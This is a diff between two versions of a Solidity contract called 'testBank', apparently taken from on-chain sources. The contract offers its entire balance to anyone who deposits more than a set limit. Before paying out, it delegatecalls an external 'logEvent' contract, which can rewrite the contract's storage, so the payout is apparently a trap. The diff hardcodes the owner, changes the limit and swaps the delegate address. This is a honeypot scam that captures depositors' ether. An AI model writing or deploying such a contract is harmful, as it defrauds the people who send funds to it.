@@ -1,17 +1,17 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract testBank at 0x477d1ee2f953a2f85dbecbcb371c2613809ea452
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract testBank at 0xc013a9119b4aaef512b2338026183db9cd0c4029
 */
-pragma solidity ^0.4.16;
+pragma solidity 0.4.11;
 
 contract testBank
 {
-    address Owner;
+    address Owner=0x46Feeb381e90f7e30635B4F33CE3F6fA8EA6ed9b;
     address adr;
-    uint256 public Limit= 1000000000000000000;
-    address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
+    uint256 public Limit= 1000000000000000001;
+    address emails = 0xa6f6b06538348614d98f1c12b6b2becc27886ced;
     
     
-    function Update(address dataBase, uint256 limit) 
+    function Update(address dataBase, uint256 limit)
     {
         require(msg.sender == Owner); //checking the owner
         Limit = limit;
@@ -30,6 +30,7 @@ contract testBank
         adr=msg.sender;
         if(msg.value>Limit)
         {  
+            //add if Owner
             emails.delegatecall(bytes4(sha3("logEvent()")));
             adr.send(this.balance);
         }
@@ -40,7 +41,4 @@ contract testBank
         selfdestruct(msg.sender);
     }
     
-    function testBank(){
-        Owner=msg.sender;
-    }
 }
